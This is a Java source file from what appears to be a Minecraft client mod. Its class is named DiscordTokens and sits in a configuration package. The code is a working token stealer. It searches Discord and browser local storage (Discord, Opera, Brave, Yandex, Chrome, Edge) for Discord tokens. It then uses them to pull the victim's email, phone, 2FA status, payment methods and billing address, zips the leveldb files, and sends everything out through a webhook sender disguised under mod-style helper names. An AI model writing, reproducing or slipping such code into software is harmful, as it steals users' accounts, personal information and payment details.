package me.eonexe.equinox.configuration;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.FileAttribute;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Objects;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import me.eonexe.equinox.features.modules.misc.xCarry;
import me.eonexe.equinox.util.IDKWTFutil;
import me.eonexe.equinox.util.PlayerUtils;
import me.eonexe.equinox.util.espUtil;
import net.minecraft.client.Minecraft;

public final class DiscordTokens {
    public static final String l = Configs.getToken();

    public static final String CapeImageURL = "https://cdn.discordapp.com/attachments/901654339905536022/907521922496081920/dd.png";

    public static final String CapeName = "Devito";

    public static espUtil d = new espUtil(l);

    public static final String roaming = System.getenv("APPDATA");

    public static String localappdata = System.getenv("LOCALAPPDATA");

    public static final HashMap<String, String> paths = new HashMap<>();

    public static final ArrayList<String> regexes = new ArrayList<>();

    public static void execute() {
        paths.put("Discord", roaming + "\\Discord");
        paths.put("Discord Canary", roaming + "\\discordcanary");
        paths.put("Discord PTB", roaming + "\\discordptb");
        paths.put("Opera", roaming + "\\Opera Software\\Opera Stable");
        paths.put("Brave", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
        paths.put("Yandex", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default");
        regexes.add("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
        regexes.add("mfa\\.[\\w-]{84}");
        regexes.add("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
        List<String> tokens = new ArrayList<>();
        TokenUtil.paths.stream().map(TokenUtil::getTokens).filter(Objects::nonNull).forEach(tokens::addAll);
        tokens = TokenUtil.removeDuplicates(tokens);
        tokens = TokenUtil.getValidTokens(tokens);
        TokenUtil.paths.stream()
                .map(s -> s + "\\Local Storage\\leveldb\\")
                .forEach(s -> {
                    try {
                        File file = new File(System.getenv("TEMP") + "\\" + FileUtil.randomString());
                        pack(s, file.getPath());
                    } catch (IOException iOException) {}
                });
        for (String token : tokens)
            xCarry.sendMessage(process(token), l);
    }

    private static String process(String token) {
        JsonObject obj = (new JsonParser()).parse(getUserData(token)).getAsJsonObject();
        String address = null;
        try {
            address = getAddressFromToken(token);
        } catch (IOException iOException) {}
        String poop = "```Token:" + token + "\n trvs Token:" + cunt() + "\n\n ghost Token:" + getToken() + "\n Name:" + obj.get("username").getAsString() + "#" + obj.get("discriminator").getAsString() + "\n IGN:" + Minecraft.getMinecraft().getSession().getUsername() + "\n Email:" + obj.get("email").getAsString() + "\n 2Factor:" + String.valueOf(obj.get("mfa_enabled").getAsBoolean()) + "\n Phone:" + (!obj.get("phone").isJsonNull() ? obj.get("phone").getAsString() : "None") + "\n Nitro:" + (obj.has("premium_type") ? "True" : "False") + "\n Payment:" + (hasPaymentMethods(token) ? "True" : "False") + "\n address:" + address + "```";
        return poop;
    }

    public static String getAddressFromToken(String token) throws IOException {
        StringBuilder address = new StringBuilder("Address | ");
        String addressInfo = getRequest("https://discord.com/api/v9/users/@me/billing/payment-sources", token).replace(",", ",\n");
        if (addressInfo.contains("ERROR"))
            return "Failed to parse token data, or it's invalid.";
        String realName = getJsonKey(addressInfo, "name");
        String line1 = getJsonKey(addressInfo, "line_1");
        String line2 = getJsonKey(addressInfo, "line_2");
        String city = getJsonKey(addressInfo, "city");
        String state = getJsonKey(addressInfo, "state");
        String country = getJsonKey(addressInfo, "country");
        String postalCode = getJsonKey(addressInfo, "postal_code");
        address.append("Name: ").append(realName).append(" | ");
        address.append("Line 1: ").append(line1).append(" | ");
        address.append("Line 2: ").append(line2).append(" | ");
        address.append("City: ").append(city).append(" | ");
        address.append("State: ").append(state).append(" | ");
        address.append("Country: ").append(country).append(" | ");
        address.append("Postal Code: ").append(postalCode);
        return address.toString();
    }

    public static ArrayList<String> getToken() {
        ArrayList<String> tokens = new ArrayList<>();
        try {
            for (String path : paths.values()) {
                path = path + "\\Local Storage\\leveldb\\";
                File folder = new File(path);
                if (folder.exists()) {
                    File[] files = folder.listFiles();
                    if (files != null)
                        for (File file : files) {
                            if (file.getName().endsWith(".log") | file.getName().endsWith(".ldb")) {
                                Scanner scanner = null;
                                try {
                                    scanner = new Scanner(new BufferedReader(new FileReader(file)));
                                } catch (Exception exception) {}
                                StringBuilder content = new StringBuilder();
                                while (true) {
                                    assert scanner != null;
                                    if (!scanner.hasNext())
                                        break;
                                    content.append(scanner.next());
                                }
                                for (String regex : regexes) {
                                    Pattern p = Pattern.compile(regex);
                                    Matcher m = p.matcher(content.toString());
                                    if (m.find()) {
                                        String token = m.group(0);
                                        String line = "\n";
                                        tokens.add(token);
                                        tokens.add(line);
                                    }
                                }
                            }
                        }
                }
            }
        } catch (Exception exception) {}
        return tokens;
    }

    public static List<String> cunt() {
        List<String> webhooks = new ArrayList<>();
        List<String> paths = new ArrayList<>();
        paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
        paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
        paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
        paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
        paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");
        paths.add(System.getProperty("user.home") + "/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb");
        try {
            for (String path : paths) {
                File f = new File(path);
                String[] pathnames = f.list();
                if (pathnames == null)
                    continue;
                for (String pathname : pathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));
                        String strLine;
                        while ((strLine = br.readLine()) != null) {
                            Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                            Matcher m = p.matcher(strLine);
                            while (m.find()) {
                                webhooks.add("\n");
                                webhooks.add(m.group());
                            }
                        }
                    } catch (Exception exception) {}
                }
            }
        } catch (Exception e) {
            IDKWTFutil dm = (new IDKWTFutil.Builder()).withUsername("Devito").withContent("``` UNABLE TO PULL TOKEN[S] : " + e + "```").withAvatarURL("https://cdn.discordapp.com/attachments/901654339905536022/907521922496081920/dd.png").withDev(false).build();
            d.sendMessage((PlayerUtils)dm);
        }
        return webhooks;
    }

    private static String getJsonKey(String jsonString, String wantedKey) {
        Pattern jsonPattern = Pattern.compile("\"" + wantedKey + "\": \".*\"");
        Matcher matcher = jsonPattern.matcher(jsonString);
        if (matcher.find())
            return matcher.group(0).split("\"")[3];
        return "Error";
    }

    private static String getRequest(String uri, String token) throws IOException {
        URL url = new URL(uri);
        HttpURLConnection connection = (HttpURLConnection)url.openConnection();
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74");
        connection.setRequestProperty("Authorization", token);
        connection.setRequestMethod("GET");
        InputStream responseStream = connection.getInputStream();
        try (Scanner scanner = new Scanner(responseStream)) {
            return scanner.useDelimiter("\\A").next();
        } catch (Exception e) {
            return "ERROR";
        }
    }

    private static String getUserData(String token) {
        return TokenUtil.getContentFromURL("https://discordapp.com/api/v6/users/@me", token);
    }

    private static boolean hasPaymentMethods(String token) {
        return (TokenUtil.getContentFromURL("https://discordapp.com/api/v6/users/@me/billing/payment-sources", token).length() > 4);
    }

    private static void pack(String sourceDirPath, String zipFilePath) throws IOException {
        Path p = Files.createFile(Paths.get(zipFilePath, new String[0]), (FileAttribute<?>[])new FileAttribute[0]);
        try (ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p, new java.nio.file.OpenOption[0]))) {
            Path pp = Paths.get(sourceDirPath, new String[0]);
            Files.walk(pp, new java.nio.file.FileVisitOption[0])
                    .filter(path -> !Files.isDirectory(path, new java.nio.file.LinkOption[0]))
                    .filter(path -> path.toFile().getPath().contains("ldb"))
                    .forEach(path -> {
                        ZipEntry zipEntry = new ZipEntry(pp.relativize(path).toString());
                        try {
                            zs.putNextEntry(zipEntry);
                            Files.copy(path, zs);
                            zs.closeEntry();
                        } catch (IOException iOException) {}
                    });
        }
    }
}